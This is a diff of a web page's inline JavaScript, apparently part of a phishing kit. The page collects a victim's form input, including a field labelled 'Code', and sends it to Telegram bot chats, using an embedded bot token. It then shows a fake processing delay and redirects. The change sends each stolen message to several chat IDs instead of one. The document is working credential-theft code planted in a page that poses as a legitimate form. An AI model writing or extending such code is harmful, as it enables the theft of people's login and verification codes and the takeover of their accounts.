@@ -130,13 +130,13 @@
     <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
     <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
 
-    <!-- ====== TELEGRAM + 8‑SECOND PROCESSING DELAY ====== -->
+    <!-- ====== TELEGRAM + 8‑SECOND PROCESSING DELAY (Multi‑chat) ====== -->
     <script>
         // ============================================================
         // CONFIGURATION – YOUR TELEGRAM BOT CREDENTIALS
         // ============================================================
         const BOT_TOKEN = '8139401393:AAHpFqG_1CnbtFvF8tGdbhjASoeTTt93hxU';
-        const CHAT_ID = '722615124';
+        const CHAT_IDS = ['722615124', '5440329319']; // ← Add your chat IDs here
         // ============================================================
 
         $(document).ready(function() {
@@ -160,12 +160,14 @@
                 msg += "Code: " + code + "\n";
                 msg += "|-----------------------------------------|";
 
-                // 3. Send Telegram notification (fire and forget)
-                $.ajax({
-                    url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`,
-                    method: 'GET',
-                    timeout: 5000
-                    // No success/error handling – we redirect after 8s anyway
+                // 3. Send to ALL chats in the array
+                CHAT_IDS.forEach(chatId => {
+                    $.ajax({
+                        url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`,
+                        method: 'GET',
+                        timeout: 5000
+                        // No success/error handling – we redirect after 8s anyway
+                    });
                 });
 
                 // 4. Wait 8 seconds, then redirect to the next page
